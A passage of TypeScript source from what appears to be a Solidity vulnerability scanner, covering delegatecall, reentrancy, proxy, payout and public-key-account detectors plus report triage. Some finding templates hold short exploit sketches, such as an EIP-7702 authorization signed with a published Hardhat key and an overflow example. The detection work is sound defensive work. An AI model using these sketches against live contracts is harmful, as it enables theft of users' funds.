type TargetClass = "caller" | "fixed";

/** Classify one call-site argument expression feeding a delegatecall
 * target parameter: "fixed" only when every path to it is stored
 * state, a constant, or a literal; anything caller-influenced or
 * unresolvable is "caller" (fail closed). */
function classifyTargetArg(
  expr: string,
  callerFn: FnModel,
  contract: ContractModel,
  byName: Map<string, FnModel>,
  direct: Map<string, CalleeInfo>,
  depth: number,
  seen: Set<string>,
): TargetClass {
  const text = expr.trim();
  if (!text || depth > 6) return "caller";
  if (/^0x[0-9a-fA-F]{40}$/.test(text) || /^address\s*\(\s*0\s*\)$/.test(text)) return "fixed";
  const rootMatch = text.match(/^[A-Za-z_]\w*/);
  const root = rootMatch ? rootMatch[0] : null;
  if (!root) return "caller";
  if (root === "msg" || root === "tx") return "caller";
  const stateVar = contract.stateVars.find((v) => v.name === root);
  if (stateVar) {
    // Stored target — unless THIS caller first overwrites it from a
    // caller-fed value (then the stored read is caller-chosen after
    // all: `impl = newImpl; delegateTo(impl)`).
    const assign = callerFn.source.match(new RegExp(`\\b${root}\\s*=[^=]([^;]*)`));
    if (assign) {
      const rhs = (assign[1] as string) ?? "";
      if (/msg\.sender/.test(rhs) || callerFn.params.some((p) => p.name && new RegExp(`\\b${p.name}\\b`).test(rhs))) {
        return "caller";
      }
    }
    return "fixed";
  }
  const param = callerFn.params.find((p) => p.name === root);
  if (param) {
    if (text !== root) return "caller"; // the param inside an expression: caller-influenced
    if (isExternallyCallable(callerFn)) return "caller";
    return classifyTargetParam(callerFn, root, contract, byName, direct, depth + 1, seen);
  }
  if (callerFn.params.some((p) => p.name && new RegExp(`\\b${p.name}\\b`).test(text))) return "caller";
  // A local variable: classify what it was assigned.
  const local = callerFn.source.match(new RegExp(`\\b${root}\\s*=\\s*([^;]+);`));
  if (local) return classifyTargetArg(local[1] as string, callerFn, contract, byName, direct, depth + 1, seen);
  return "caller";
}

/** Classify a parameter of an internal function by tracing every
 * in-contract call site that feeds it. */
function classifyTargetParam(
  fn: FnModel,
  paramName: string,
  contract: ContractModel,
  byName: Map<string, FnModel>,
  direct: Map<string, CalleeInfo>,
  depth: number,
  seen: Set<string>,
): TargetClass {
  const key = `${fn.name}:${paramName}`;
  if (seen.has(key) || depth > 6) return "caller";
  seen.add(key);
  const idx = fn.params.findIndex((p) => p.name === paramName);
  if (idx < 0) return "caller";
  let sawFeed = false;
  for (const [callerName, info] of direct) {
    if (!info.callees.has(fn.name)) continue;
    const callerFn = byName.get(callerName);
    if (!callerFn) continue;
    for (const site of callSiteArgs(callerFn, fn.name)) {
      const arg = (site[idx] ?? "").trim();
      if (!arg) continue;
      sawFeed = true;
      if (classifyTargetArg(arg, callerFn, contract, byName, direct, depth, seen) === "caller") return "caller";
    }
  }
  return sawFeed ? "fixed" : "caller";
}

/** Generic AST walk (the profile() idiom): invokes cb on every node. */
function walkAst(node: unknown, cb: (n: AstNode) => void): void {
  if (!node || typeof node !== "object") return;
  if (Array.isArray(node)) {
    for (const v of node) walkAst(v, cb);
    return;
  }
  const n = node as AstNode;
  if (typeof n.type === "string") cb(n);
  for (const key of Object.keys(n)) {
    if (key === "loc" || key === "range") continue;
    walkAst((n as unknown as Record<string, unknown>)[key], cb);
  }
}

function subtreeContainsNode(root: AstNode, target: AstNode): boolean {
  let found = false;
  walkAst(root, (n) => {
    if (n === target) found = true;
  });
  return found;
}

/** Hand-rolled reentrancy mutex: a bool state var CHECKED at entry
 * (require(!flag), if (flag) revert…), SET before the external call
 * and CLEARED after it. KatWalkerz' `withdrawing` is the shape: the
 * CEI violation is real, the mutex makes it unexploitable. Returns
 * the flag's name when the full pattern holds around `callLine`. */
function mutexAroundCall(
  fn: FnModel,
  contract: ContractModel,
  parsed: string,
  delta: number,
  callLine: number,
): string | null {
  if (!fn.body) return null;
  const bools = new Set(contract.stateVars.filter((v) => v.typeName === "bool").map((v) => v.name));
  if (!bools.size) return null;
  const checkLine = new Map<string, number>();
  const setTrueLine = new Map<string, number>();
  const setFalseLine = new Map<string, number>();
  walkAst(fn.body, (n) => {
    if (n.type === "BinaryOperation" && n.operator === "=") {
      const root = rootIdent(n.left as AstNode);
      if (root && bools.has(root)) {
        const rhs = sliceOf(parsed, n.right as AstNode).trim();
        const line = lineOf(n, delta, fn.line);
        if (rhs === "true" && !setTrueLine.has(root)) setTrueLine.set(root, line);
        if (rhs === "false" && !setFalseLine.has(root)) setFalseLine.set(root, line);
      }
    }
    let cond: AstNode | undefined;
    if (n.type === "IfStatement") cond = n.condition as AstNode;
    if (n.type === "FunctionCall") {
      const callee = unwrapCallee(n.expression as AstNode);
      if (callee.member === "require" || callee.member === "assert") {
        cond = (n.arguments as AstNode[] | undefined)?.[0];
      }
    }
    if (cond) {
      const text = sliceOf(parsed, cond).trim();
      for (const b of bools) {
        if (new RegExp(`!\\s*${b}\\b|\\b${b}\\s*==\\s*false|\\b${b}\\s*!=\\s*true|^${b}$`).test(text)) {
          const line = lineOf(n, delta, fn.line);
          if (!checkLine.has(b) || line < (checkLine.get(b) as number)) checkLine.set(b, line);
        }
      }
    }
  });
  for (const b of bools) {
    const c = checkLine.get(b);
    const t = setTrueLine.get(b);
    const f = setFalseLine.get(b);
    if (c !== undefined && t !== undefined && f !== undefined && c <= t && t < callLine && f > callLine) return b;
  }
  return null;
}

type OutcomeWrite = { decrement: boolean; failureOnly: boolean };

/** Branch-aware read of the writes that follow the seen call: for
 * each written state var, whether the write is a DECREMENT and
 * whether it runs ONLY on the call's failure arm. This is the
 * analysis the dividend family demands: the entitlement is written
 * BEFORE the call, the call is made, and on failure the write is
 * rolled back (`if (!success) { withdrawn[user] = withdrawn[user]
 * .sub(amount); }`) — CEI holds, and a line-order pattern match
 * cannot see it. Returns null when the seen call cannot be located
 * in this function's own body (a synthetic/internal-callee call has
 * no outcome variable here — fail closed, no rollback credit). */
function analyzeCallOutcome(
  fn: FnModel,
  parsed: string,
  delta: number,
  seenLine: number,
): { postWrites: Map<string, OutcomeWrite[]> } | null {
  if (!fn.body) return null;
  let callNode: AstNode | null = null;
  walkAst(fn.body, (n) => {
    if (callNode || n.type !== "FunctionCall") return;
    const callee = unwrapCallee(n.expression as AstNode);
    if ((callee.member === "call" || callee.member === "send") && lineOf(n, delta, fn.line) === seenLine) {
      callNode = n;
    }
  });
  if (!callNode) return null;
  const seen = callNode as AstNode;
  const successVars = new Set<string>();
  walkAst(fn.body, (n) => {
    if (n.type === "VariableDeclarationStatement") {
      const init = n.initialValue as AstNode | undefined;
      if (init && subtreeContainsNode(init, seen)) {
        const decls = (n.variables as AstNode[] | undefined) ?? (n.declarations as AstNode[] | undefined) ?? [];
        for (const d of decls) {
          if (d && typeof d.name === "string") successVars.add(d.name);
        }
      }
    }
    if (n.type === "BinaryOperation" && n.operator === "=" && subtreeContainsNode(n.right as AstNode, seen)) {
      walkAst(n.left, (x) => {
        if ((x.type === "VariableDeclaration" || x.type === "Identifier") && typeof x.name === "string") {
          successVars.add(x.name as string);
        }
      });
    }
  });
  const negatedCall = (cond: AstNode): boolean =>
    cond.type === "UnaryOperation" && cond.operator === "!" && subtreeContainsNode(cond, seen);
  const isFailureTest = (cond: AstNode | undefined): boolean => {
    if (!cond) return false;
    if (successVars.size === 0) return subtreeContainsNode(cond, seen) && negatedCall(cond);
    const text = sliceOf(parsed, cond);
    for (const v of successVars) {
      if (new RegExp(`!\\s*${v}\\b`).test(text)) return true;
      if (new RegExp(`\\b${v}\\s*==\\s*false\\b`).test(text)) return true;
      if (new RegExp(`\\bfalse\\s*==\\s*${v}\\b`).test(text)) return true;
      if (new RegExp(`\\b${v}\\s*!=\\s*true\\b`).test(text)) return true;
    }
    return false;
  };
  const isSuccessTest = (cond: AstNode | undefined): boolean => {
    if (!cond) return false;
    if (successVars.size === 0) return subtreeContainsNode(cond, seen) && !negatedCall(cond);
    const text = sliceOf(parsed, cond);
    for (const v of successVars) {
      if (new RegExp(`\\b${v}\\s*==\\s*true\\b`).test(text)) return true;
      if (new RegExp(`\\b${v}\\s*!=\\s*false\\b`).test(text)) return true;
      if (new RegExp(`^\\s*${v}\\s*$`).test(text)) return true;
    }
    return false;
  };
  const postWrites = new Map<string, OutcomeWrite[]>();
  const record = (root: string, w: OutcomeWrite) => {
    const list = postWrites.get(root) ?? [];
    list.push(w);
    postWrites.set(root, list);
  };
  const visitStmts = (node: unknown, failureOnly: boolean): void => {
    if (!node || typeof node !== "object") return;
    if (Array.isArray(node)) {
      for (const v of node) visitStmts(v, failureOnly);
      return;
    }
    const n = node as AstNode;
    if (n.type === "IfStatement") {
      const cond = n.condition as AstNode;
      visitStmts(n.trueBody, failureOnly || isFailureTest(cond));
      if (n.falseBody) visitStmts(n.falseBody, failureOnly || isSuccessTest(cond));
      return;
    }
    if (n.type === "BinaryOperation" && typeof n.operator === "string" && ASSIGN.has(n.operator)) {
      const root = rootIdent(n.left as AstNode);
      if (root && lineOf(n, delta, fn.line) > seenLine) {
        const rhs = sliceOf(parsed, n.right as AstNode);
        const decrement =
          n.operator === "-=" ||
          (n.operator === "=" &&
            (new RegExp(`\\.\\s*sub\\s*\\(`).test(rhs) && rhs.includes(root) ||
              new RegExp(`^\\s*${root}\\s*(\\[[^\\]]*\\])?\\s*-`).test(rhs)));
        record(root, { decrement, failureOnly });
      }
      return;
    }
    if (n.type === "UnaryOperation" && (n.operator === "++" || n.operator === "--")) {
      const root = rootIdent(n.subExpression as AstNode);
      if (root && lineOf(n, delta, fn.line) > seenLine) {
        record(root, { decrement: n.operator === "--", failureOnly });
      }
      return;
    }
    for (const key of Object.keys(n)) {
      if (key === "loc" || key === "range") continue;
      visitStmts((n as unknown as Record<string, unknown>)[key], failureOnly);
    }
  };
  visitStmts(fn.body, false);
  return { postWrites };
}

/** The dividend verdict: some credit var was settled BEFORE the call
 * and every post-call write to a credit var is a failure-arm
 * decrement (a rollback of that settlement). Returns the settled
 * var's name, or null when any post-call credit write is a genuine
 * post-payment state change (the window is real) or the outcome
 * cannot be read (fail closed). */
function rollbackSettledVar(
  fn: FnModel,
  parsed: string,
  delta: number,
  seenLine: number,
  preCallWrites: Set<string>,
  postCallWrites: Set<string>,
  creditVars: Set<string>,
): string | null {
  const outcome = analyzeCallOutcome(fn, parsed, delta, seenLine);
  if (!outcome) return null;
  for (const v of postCallWrites) {
    if (!creditVars.has(v)) continue;
    const writes = outcome.postWrites.get(v) ?? [];
    if (writes.length === 0) return null; // flow saw a write the AST pass missed — fail closed
    if (!writes.every((w) => w.decrement && w.failureOnly)) return null;
  }
  for (const v of preCallWrites) {
    if (!creditVars.has(v)) continue;
    const writes = outcome.postWrites.get(v) ?? [];
    if (writes.length > 0 && writes.every((w) => w.decrement && w.failureOnly)) return v;
  }
  return null;
}

/**
 * True when the function body unconditionally reverts: the first
 * statement is revert(...) / require(false) / assert(false), so no call
 * can ever execute past it. StarkWare's Proxy.initialize is exactly
 * this — a revert-only guard function that exists so upgradeTo can
 * delegatecall the implementation's initialize by selector. Flagging it
 * "callable by anyone" is a false positive: nobody can call it
 * successfully at all.
 */
function alwaysReverts(fnSrc: string): boolean {
  const clean = fnSrc
    .replace(/\/\/[^\n]*/g, "")
    .replace(/\/\*[\s\S]*?\*\//g, "");
  const brace = clean.indexOf("{");
  if (brace === -1) return false;
  const body = clean.slice(brace + 1).trimStart();
  return /^(revert\s*\(|require\s*\(\s*false\b|assert\s*\(\s*false\b)/.test(body);
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * True when a delegatecall target parameter is constrained by stored
 * state, not freely chosen by the caller at call time. Two shapes:
 *
 * - Direct: a require reads a mapping keyed by the target itself:
 *   require(allowlist[target]).
 * - Derived (StarkWare upgradeTo): the target flows through assignments
 *   (implVectorHash = keccak256(abi.encode(newImplementation, ...));
 *   activationTime = enabledTime[implVectorHash]), a require mentions a
 *   derived identifier (activationTime > 0, activationTime <=
 *   block.timestamp), and a mapping is keyed by a derived identifier.
 *   The fixpoint follows the assignment chain transitively.
 *
 * Fails closed: anything it cannot prove constrained stays flagged.
 */
function delegateTargetIsConstrained(fnSrc: string, targetParam: string): boolean {
  const clean = fnSrc
    .replace(/\/\/[^\n]*/g, "")
    .replace(/\/\*[\s\S]*?\*\//g, "");
  const esc = escapeRegExp(targetParam);
  // Direct: require(...) reads a mapping keyed by the target itself.
  if (rx(`require\\s*\\([^)]*\\[[^\\]]*\\b${esc}\\b[^\\]]*\\]`).test(clean)) return true;
  // Derived: fixpoint over assignments mentioning the target or a
  // previously derived identifier.
  const derived = new Set<string>();
  let grew = true;
  while (grew) {
    grew = false;
    const known = [targetParam, ...derived].map(escapeRegExp).join("|");
    const assignRe = rx(`\\b([A-Za-z_]\\w*)\\s*=(?!=)[^;=]*\\b(?:${known})\\b`, "g");
    let m: RegExpExecArray | null;
    while ((m = assignRe.exec(clean)) !== null) {
      if (m[1] !== targetParam && !derived.has(m[1])) {
        derived.add(m[1]);
        grew = true;
      }
    }
  }
  if (derived.size === 0) return false;
  const names = [...derived].map(escapeRegExp).join("|");
  const requireMentionsDerived = rx(`require\\s*\\([^)]*\\b(?:${names})\\b`).test(clean);
  const mappingKeyedByDerived = rx(`\\[[^\\]]*\\b(?:${names})\\b[^\\]]*\\]`).test(clean);
  return requireMentionsDerived && mappingKeyedByDerived;
}

/**
 * True when the function pays out of a credited balance it is entitled to
 * spend: it DEBITS a per-user credit mapping, and either the debited
 * account is msg.sender itself, or an allowance check proves msg.sender
 * may spend that account's credit (the transferFrom shape). Such a send
 * is a withdrawal / authorized transfer of credited funds, not an
 * unprotected drain — the debit IS the access check.
 *
 * A mere require bound (require(balanceOf[msg.sender] >= x)) with NO
 * debit does NOT exempt: the caller could repeat the send without ever
 * losing credit. A debit of someone else's balance with NO allowance
 * check is still flagged. This replaces the old usesCredit exemption,
 * which exempted any function that merely mentioned a balance mapping.
 */
/** Upgrade entry points whose whole job is to point a proxy at a new
 * implementation. On a proxy-shaped contract this is the standard
 * surface, not an anomaly (Fix 36). */
const PROXY_UPGRADE_FNS = new Set(["upgradeTo", "upgradeToAndCall", "setImplementation", "_setImplementation"]);

/**
 * True when the contract ITSELF is a proxy — as opposed to an
 * upgradeable implementation. Initializable / UUPSUpgradeable bases
 * live in the implementation, so an "upgradeable" base alone does NOT
 * count. Signals, any one sufficient:
 * - the name says proxy (TransparentUpgradeableProxy,
 *   InitializableAdminUpgradeabilityProxy, ERC1967Proxy, ...);
 * - a base is a proxy base (Proxy, ERC1967Proxy,
 *   BaseAdminUpgradeabilityProxy, ...);
 * - a fallback that delegatecalls, together with the EIP-1967
 *   implementation slot constant or an implementation state variable
 *   (the dispatch shape).
 */
function isProxyShape(contract: ContractModel): boolean {
  if (/proxy/i.test(contract.name)) return true;
  if (contract.bases.some((b) => /proxy|erc1967/i.test(b))) return true;
  const hasFallbackDelegatecall = contract.functions.some((f) => f.isFallback && /delegatecall/.test(f.source));
  if (!hasFallbackDelegatecall) return false;
  const hasImplSlot = contract.functions.some((f) =>
    f.source.includes("360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"),
  );
  const hasImplVar = contract.stateVars.some((v) => /^(implementation|_implementation|impl)$/i.test(v.name));
  return hasImplSlot || hasImplVar;
}

/**
 * Source of fn plus every internal function it transitively calls (via
 * the direct call graph). Payout bounds and debits often live in an
 * internal helper (processClaim) rather than the entry function, so a
 * check that only reads fn.source misses them.
 */
function transitiveSources(
  fn: FnModel,
  byName: Map<string, FnModel>,
  direct: Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>,
): string {
  const seen = new Set<string>([fn.name]);
  const queue = [fn.name];
  const parts = [fn.source];
  while (queue.length) {
    const name = queue.shift()!;
    for (const callee of direct.get(name)?.callees ?? []) {
      if (seen.has(callee)) continue;
      seen.add(callee);
      queue.push(callee);
      const calleeFn = byName.get(callee);
      if (calleeFn) parts.push(calleeFn.source);
    }
  }
  return parts.join("\n");
}

/**
 * A payout is Merkle-bounded when (a) the payout path verifies a Merkle
 * proof binding (recipient, amount), (b) the recipient is exactly
 * msg.sender (not a caller-supplied address), and (c) a per-user
 * accumulator caps repeat claims (claimed[x] + amt > allocation reverts,
 * or a claimed[x] guard). Then the payout is the caller's own proven
 * entitlement, not an open drain. All three must hold: a Merkle proof
 * with no double-claim guard, or a Merkle proof paying a param address,
 * is still drainable.
 */
function isMerkleBoundedPayout(
  fn: FnModel,
  sendTargets: string[],
  transitiveSrc: string,
): boolean {
  if (!/MerkleProof\s*\.\s*verify\s*\(/.test(transitiveSrc)) return false;
  const recipientIsSender = sendTargets.some((t) => {
    const target = t.trim();
    if (target === "msg.sender") return true;
    const ident = target.replace(/[^A-Za-z0-9_$]/g, "");
    if (!ident) return false;
    return rx(`\\b${ident}\\s*=\\s*msg\\.sender\\b`).test(fn.source);
  });
  if (!recipientIsSender) return false;
  return (
    /\w+\s*\[\s*[\w.]+\s*\]\s*\+\s*\w+\s*>/.test(transitiveSrc) ||
    /require\s*\(\s*!\s*\w*claimed\w*\s*\[/.test(transitiveSrc)
  );
}

function debitsOwnCredit(fn: FnModel, source?: string): boolean {
  const src = source ?? fn.source;
  // Fix 22: a cross-contract burn of the caller's own tokens
  // (token.burnAll(msg.sender) / burnFrom(msg.sender, ...) /
  // burn(msg.sender, ...)) is a per-user debit — StakeWar's payout
  // burns ALL the caller's bonds before paying them. A bare
  // token.burn(amount) is NOT a debit of the caller: it burns the
  // calling contract's own tokens (msg.sender to the token is this
  // contract), so it does not count.
  if (/\.(burn|burnFrom|burnAll)\s*\(\s*msg\.sender\b/.test(src)) return true;
  // Credit mappings: balance-family names match by content — usersBalance,
  // tokenBalanceLedger_, balances, _balances, balanceOf are all balance
  // accounting (the ERC721Token withdrawUsers FP: usersBalance[msg.sender]
  // = 0 is a full debit, but the old list missed the name). Dividend /
  // payout accounting (payoutsTo_ += marks dividends paid, claimed[x] =
  // true closes a claim) matches by name. `claimed` stays \b-anchored so
  // `unclaimed` (an accrual mapping) does not match it.
  const credit = "(?:[\\w]*[Bb]alance[\\w]*|[\\w]*deposits|[\\w]*credits|[\\w]*payoutsTo_?|\\bpaidOut|\\bclaimed|\\bwithdrawn)";
  const debit = src.match(rx(`${credit}\\s*\\[\\s*([\\w.]+)\\s*\\]\\s*[-+*/%]?=`));
  if (!debit) return false;
  const account = debit[1];
  if (account === "msg.sender") return true;
  // The debited account may be a local assigned from msg.sender
  // (DailyDivs withdraw: `address _customerAddress = msg.sender`).
  if (rx(`\\b${escapeRegExp(account)}\\s*=\\s*msg\\.sender\\b`).test(src)) return true;
  return rx(`allowance\\s*\\[\\s*${account}\\s*\\]\\s*\\[\\s*msg\\.sender\\s*\\]\\s*>=`).test(src);
}

/** Report cap: beyond this the least-severe findings are dropped (visibly). */
export const MAX_FINDINGS = 40;

let seq = 0;
function make(
  partial: Omit<Finding, "id">,
): Finding {
  seq += 1;
  return { id: `s${seq}`, ...partial };
}

/** Severity order used by the report sort. */
const SEVERITY_RANK: Record<Severity, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

/** Reachability order used by triage: what a human should read first. */
const REACHABILITY_RANK: Record<string, number> = {
  REACHABLE: 0,
  NEEDS_READ: 1,
  BOUNDED: 2,
  GATED: 3,
  INTERNAL: 4,
};

const CONFIDENCE_ORDER: Record<Finding["confidence"], number> = { high: 0, medium: 1, low: 2 };

/** The lower of two confidence levels. */
function minConfidence(a: Finding["confidence"], b: Finding["confidence"]): Finding["confidence"] {
  return CONFIDENCE_ORDER[a] >= CONFIDENCE_ORDER[b] ? a : b;
}

/**
 * Derive confidence from the evidence instead of trusting the rule's claim.
 *
 * Every rule hardcodes `confidence: "high"`, which makes the field a constant
 * rather than a signal. Two pieces of evidence now cap it, and the reason is
 * recorded in `confidenceBasis` so a reviewer can see why:
 *
 *  - a NEEDS_READ site carries a modifier the analyzer could not resolve, so
 *    the finding might be gated: cap at medium;
 *  - a GATED_PRECONDITION site is gated on TEXT the analyzer matched, not on a
 *    resolved modifier or a proven role: cap at medium.
 *
 * Nothing is ever raised — a rule that claims low confidence keeps it.
 */
function calibrateConfidence(findings: Finding[]): void {
  for (const f of findings) {
    let cap: Finding["confidence"] = "high";
    let basis = f.locationFn ? "resolved" : "file-level";
    if (f.reachability === "NEEDS_READ") {
      cap = "medium";
      basis = "unresolved-gate";
    } else if (f.gate === "GATED_PRECONDITION") {
      cap = "medium";
      basis = "precondition-text";
    }
    f.confidence = minConfidence(f.confidence, cap);
    f.confidenceBasis = basis;
  }
}

/** A money figure in finding text: the thing that must never be published raw. */
const MONEY_FIGURE =
  /(?:\$\s?\d[\d,.]*)|(?:\d[\d,.]*\s*(?:ETH|WETH|BTC|USD|USDC|USDT|DAI|wei|rsETH|stETH)\b)/;

/**
 * Economic discipline, enforced rather than documented.
 *
 * The engagement's worst single error was publishing a 400x-overstated pot
 * (30.8 ETH against a 0.0775 ETH pool) because a source constant was treated as
 * live state, and an 87x gas-cost overstatement from an assumed 20 gwei. The
 * rule that prevents it is not a rule about detectors: it is that every
 * published figure carries where it came from.
 *
 * Any finding whose text contains a money figure gets an `economicClaim` with
 * basis "assumption" (no rule can prove a live read) and a caution appended to
 * its summary. A consumer that renders the number renders the basis with it, or
 * it is publishing an assumption as a measurement.
 */
function flagEconomicClaims(findings: Finding[]): void {
  for (const f of findings) {
    if (f.economicClaim) continue;
    const figure = `${f.summary} ${f.walkthrough}`.match(MONEY_FIGURE);
    if (!figure) continue;
    f.economicClaim = { figure: figure[0].trim(), basis: "assumption" };
    f.summary = `${f.summary} (The figure "${figure[0].trim()}" is illustrative, not a live read — fetch the live value and state its basis before publishing it.)`;
  }
}

/** Mechanism family for every finding (item: group by story, not by rule). */
function tagFamilies(findings: Finding[]): void {
  for (const f of findings) {
    if (!f.family) f.family = familyForDetector(f.detector);
  }
}

/**
 * Triage order: REACHABLE first, then NEEDS_READ, then the gated and bounded
 * classes, then severity inside each. This is the order the plan asks for —
 * "the decisive question is always who can reach this" — and it is exported so
 * the workbench can use the same order the report does.
 */
export function sortFindingsForTriage<T extends Finding>(findings: readonly T[]): T[] {
  return [...findings].sort((a, b) => {
    const ra = a.reachability ? (REACHABILITY_RANK[a.reachability] ?? 5) : 5;
    const rb = b.reachability ? (REACHABILITY_RANK[b.reachability] ?? 5) : 5;
    if (ra !== rb) return ra - rb;
    const sa = SEVERITY_RANK[a.severity];
    const sb = SEVERITY_RANK[b.severity];
    if (sa !== sb) return sa - sb;
    return (a.locationLine ?? 0) - (b.locationLine ?? 0);
  });
}

/** The only findings that are reported: the reachable ones (plan §5). */
export function reportableFindings<T extends Finding>(findings: readonly T[]): T[] {
  return findings.filter((f) => f.reachability === "REACHABLE");
}

/**
 * Phase 4 (2026-10-27 detection upgrade): tag findings with the class that
 * answers "who can reach this?".
 *
 * Scope is deliberate. A site the model can resolve to an externally
 * callable function gets a real class; an internal/private helper is left
 * untagged, because detectSource attributes helper findings to their public
 * entries and a bare INTERNAL tag on the helper would contradict that
 * attribution. Nothing here changes a severity or drops a finding — the
 * class is evidence for triage and for the report filter.
 */
function tagReachability(findings: Finding[], model: SourceModel): void {
  const index = new Map<string, { fn: FnModel; contract: ContractModel }>();
  for (const contract of model.contracts) {
    for (const fn of contract.functions) {
      if (fn.body === null) continue;
      if (!index.has(fn.name)) index.set(fn.name, { fn, contract });
    }
  }
  for (const finding of findings) {
    if (!finding.locationFn) continue;
    const hit = index.get(finding.locationFn);
    if (!hit) continue;
    const { fn, contract } = hit;
    if (fn.visibility === "internal" || fn.visibility === "private") continue;
    const hasDerivedContracts = model.contracts.some(
      (c) => c !== contract && c.bases.includes(contract.name),
    );
    const verdict = classifyFunction(fn, {
      hasDerivedContracts,
      stateVars: contract.stateVars.map((s) => ({ name: s.name, constOrImmutable: s.constOrImmutable })),
      // Caller-owned accounting: a balance read keyed by the caller bounds
      // the amount to what they themselves own (E5: "does it send ETH" is
      // not "can it be drained").
      callerOwnedAccounting:
        /\b(?:balances|balanceOf|deposits|credit|shares|stake|owed|pending)\w*\s*(?:\[\s*(?:msg\.sender|_msgSender\s*\(\s*\))|\()/.test(fn.source),
    });
    finding.reachability = verdict.class;
    finding.gate = verdict.gate;
    if (verdict.preconditions.length > 0) finding.preconditions = verdict.preconditions;
  }
}

export function detectSource(model: SourceModel, displaySource: string, onlyContract?: string | null): Finding[] {
  seq = 0;
  const findings: Finding[] = [];
  const seen = new Set<string>();
  const push = (f: Finding) => {
    const key = `${f.detector}|${f.locationFn}|${f.locationLine}|${f.title}`;
    if (seen.has(key)) return;
    seen.add(key);
    findings.push(f);
  };

  const parsed = model.parsedSource;
  const delta = model.lineDelta;

  // When the caller knows which contract is deployed at the address (e.g.
  // Sourcify single-file match: Deed.sol -> contract Deed), scope
  // contract-level findings to it AND its inherited bases (their code IS
  // the deployed contract: TetherToken inherits Ownable, so Ownable's
  // transferOwnership finding belongs to the USDT address). A sibling
  // contract in the same file (the Registrar in Deed.sol) is NOT a base,
  // so its bugs are not attributed to the Deed address. If the name
  // matches no contract, fall back to all contracts (previous behavior).
  // File-level findings (pragma, compiler, RTL) still apply to the file.
  const scopedContracts = (() => {
    if (!onlyContract) return model.contracts;
    const target = model.contracts.find((c) => c.name === onlyContract);
    if (!target) return model.contracts;
    const keep = new Set<string>([target.name]);
    const queue = [target];
    while (queue.length) {
      const cur = queue.pop()!;
      for (const b of cur.bases) {
        if (keep.has(b)) continue;
        keep.add(b);
        const base = model.contracts.find((c) => c.name === b);
        if (base) queue.push(base);
      }
    }
    return model.contracts.filter((c) => keep.has(c.name));
  })();

  if (/[\u202A-\u202E\u2066-\u2069]/.test(displaySource)) {
    push(make({
      severity: "high",
      swc: "SWC-130",
      title: "Bidirectional-override characters in the source",
      confidence: "high",
      detector: "rtl-override",
      summary: "The paste contains Unicode bidi overrides (U+202A–U+202E or isolates). They can make a reviewer read an address or a name backwards.",
      walkthrough: "1. Strip the source to ASCII and re-read every address literal.\n2. A right-to-left override inside a comment or string can hide the real callee.",
      exploitSolidity: "",
      remediationSolidity: "// Reject the file. Re-type literals by hand from a known-good copy.",
      locationFn: null,
      locationLine: null,
      snippet: "",
    }));
  }

  // public-key-account-trust (2026-10-27, AlpsCon AI Trade Hub, Oct 2026):
  // a hardcoded address whose private key is published in every tutorial.
  // The AlpsCon reward gate trusted the canonical Hardhat account
  // 0xf39Fd6e5… as a verified depositor; the attacker signed an EIP-7702
  // authorization with that known key and passed every gate. An address
  // literal with a public key is not a trust anchor, it is an open door —
  // so any occurrence is reported, wherever it sits (a constant, a
  // constructor assignment, a whitelist mapping seed, a role grant).
  {
    const lowered = parsed.toLowerCase();
    for (const acct of PUBLIC_KEY_ACCOUNTS) {
      const idx = lowered.indexOf(acct.address);
      if (idx < 0) continue;
      const line = Math.max(1, parsed.slice(0, idx).split("\n").length - delta);
      push(make({
        severity: "critical",
        swc: "SWC-105",
        title: `The source trusts ${acct.note}, whose private key is public`,
        confidence: "high",
        detector: "public-key-account-trust",
        summary: `The address ${acct.address} is ${acct.note} — a well-known development account whose private key is published in the tooling's own documentation. Anything it is trusted for (a whitelist entry, an owner, a role, a fee recipient) is controlled by anyone who reads the docs, and an EIP-7702 delegation lets that key run arbitrary code as the account. This is the AlpsCon AI Trade Hub exploit (October 2026): the reward gate kept the canonical Hardhat account on its onlyVerified whitelist, and the attacker used the known key to pass every gate.`,
        walkthrough: `1. ${acct.address} is ${acct.note}; its private key is in the framework's README.\n2. Whatever privilege the source grants it — whitelist, owner, minter, verifier — is available to any reader.\n3. With EIP-7702 the holder can also delegate the account to code and act through it, so the account behaves like an attacker contract.\n4. Remove the entry, or rotate it to a key this deployment actually controls, before the contract is live.`,
        exploitSolidity: `// The published key signs anything this address is trusted for.\n// With EIP-7702 it can also delegate to attacker code:\n// type-4 tx: authorization = { chainId, address: ATTACKER_CODE, nonce }, signed by the known key.`,
        remediationSolidity: `// Never ship a development account as a trust anchor.\naddress public constant VERIFIED_DEPOSITOR = 0x…; // a key this deployment controls\nrequire(onlyVerified[msg.sender], "not verified");`,
        locationFn: null,
        locationLine: line,
        snippet: snippet(parsed, line + delta, delta),
      }));
      break;
    }
  }

  if (model.floatingPragma && model.pragma) {
    push(make({
      severity: "low",
      swc: "SWC-103",
      title: "Floating pragma",
      confidence: "high",
      detector: "floating-pragma",
      summary: `Pragma \`${model.pragma}\` does not pin a compiler. A later solc in that range can change bytecode, metadata, or bug exposure.`,
      walkthrough: "1. Floating constraints (^, >=, <) let the build pick whatever solc the environment has.\n2. Pin the exact version you audited, and commit the compiler settings.",
      exploitSolidity: "",
      remediationSolidity: `pragma solidity ${model.versionFloor ? formatVer(model.versionFloor) : "0.8.24"};`,
      locationFn: null,
      locationLine: 1,
      snippet: snippet(parsed, 1 + delta, delta),
    }));
  }

  if (model.versionFloor !== null && model.versionFloor < 8_000) {
    push(make({
      severity: "low",
      swc: "SWC-101",
      title: "Compiler is older than 0.8.0",
      confidence: "high",
      detector: "old-compiler",
      summary: "Solidity before 0.8.0 does not revert on overflow or underflow. The version alone exploits nothing: the risk is unchecked arithmetic, which is covered by its own findings, and SafeMath mitigates it. This is a toolchain-hygiene note, not a vulnerability — it was scored high and inflated every pre-0.8 contract (FomoXP, EtherFlip).",
      walkthrough: [
        "1. `balances[msg.sender] += msg.value` wraps at 2^256-1.",
        "2. A balance near the max, plus a small deposit, becomes a tiny balance and breaks the invariant.",
        "3. Underflow on a subtraction is the usual stolen-credit path: `0 - 1` becomes the maximum uint.",
      ].join("\n"),
      exploitSolidity: `// 0.7.6 arithmetic
uint256 credit = type(uint256).max - 1;
credit += 2; // equals 1. The deposit was not rejected.`,
